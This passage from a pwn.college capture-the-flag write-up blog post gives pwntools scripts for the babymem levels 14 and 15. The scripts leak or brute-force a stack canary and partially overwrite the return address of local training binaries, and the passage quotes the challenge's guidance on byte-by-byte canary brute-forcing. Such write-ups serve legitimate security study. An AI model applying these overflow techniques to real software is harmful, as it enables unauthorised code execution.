+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>r = process(<span class="hljs-string">&quot;/challenge/babymem_level14.0&quot;</span>)<br>payload1 = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">49</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br><br>r.sendlineafter(<span class="hljs-string">b&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload1)))<br><br>r.sendafter(<span class="hljs-string">b&#x27;bytes)!\n&#x27;</span>, payload1)<br>r.recvuntil(<span class="hljs-string">&quot;- the canary value is now 0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(r.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;addr =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>r.sendline(<span class="hljs-string">&quot;346&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">328</span> + p64(canary) + <span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;\xbc\x1f&#x27;</span>)<br><span class="hljs-comment">#r.interactive()</span><br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h4><p>from pwn import *<br>r &#x3D; process(“&#x2F;challenge&#x2F;babymem_level15.0”)<br>s &#x3D; remote(‘localhost’,1337, typ&#x3D;’tcp’)</p>
+<p>That means that you will need to input at least 48 bytes (19 to fill the buffer,<br>21 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>While canaries are enabled, this networked program forks.<br>What is important to note is that the canary does not get re-randomized on fork.<br>When data that you are overflowing into is critical (i.e., if you screw it up<br>the program crashes), but also static across executions, you can brute-force<br>it byte by byte over many attempts.</p>
+<p>So, let’s brute-force the canary!<br>If this is your first time running this program, all you know so far is that<br>the canary has a 0 as its left-most byte.<br>You should proceed like this:</p>
+<ul>
+<li>First, you should try overflowing just the null byte of the canary, for<br>practice. The canary starts at 0x7ffef4ed8c88, which is 24 bytes after the<br>start of your buffer. Thus, you should provide 24 characters followed<br>by a NULL byte, make sure the canary check passes, then try a non-NULL<br>byte and make sure the canary check fails. This will confirm the offsets.</li>
+<li>Next try each possible value for just the next byte. One of them (the same<br>as whatever was there in memory already) will keep the canary intact, and<br>when the canary check succeeds, you know you have found the correct one.</li>
+<li>Go on to the next byte, leak it the same way, and so on, until you have<br>the whole canary.</li>
+</ul>
+<p>You will likely want to script this process! Each byte might take up to 256<br>tries to guess..</p>
+<p>地址：0x1ce5</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">from pwn import *<br>r = process(&quot;/challenge/babymem_level15.0&quot;)<br>s = remote(&#x27;localhost&#x27;,1337, typ=&#x27;tcp&#x27;)<br>t = remote(&#x27;localhost&#x27;,1337, typ=&#x27;tcp&#x27;)<br>payload1 = b&#x27;REPEAT&#x27; + b&#x27;a&#x27;*4 + b&#x27;b&#x27;<br><br>s.sendlineafter(b&#x27;Payload size: &#x27;, str(len(payload1)))<br>s.sendafter(b&#x27;bytes)!\n&#x27;, payload1)<br>s.recvuntil(&quot;- the canary value is now 0x&quot;)<br>canary = int(s.recvline()[:-2], 16)<br>log.success(&quot;canary =&gt; &#123;&#125;&quot;.format(hex(canary)))<br><br>t.sendline(&quot;42&quot;)<br>t.sendline(b&#x27;\xaa&#x27; * 24 + p64(canary) + b&#x27;\xaa&#x27; * 8 + b&#x27;\xe5\x1c&#x27;)<br>t.interactive()<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">print</span>(t.readall())</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn-college/">#pwn.college</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college: Memory Error</div>
+      <div>https://adamyoung71.github.io/2022/03/12/2022-3-12-Memory-Error/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Adam</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年3月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/16/2022-3-16-Web-Cache-Deception-Attack-Instruction/" title="Web Cache Deception Attack Simulaton">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Web Cache Deception Attack Simulaton</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/11/2022-3-11-Computer-Security-II-Web-Cache-Deception/" title="Web Cache Deception Attack Simulation">
+                        <span class="hidden-mobile">Web Cache Deception Attack Simulation</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
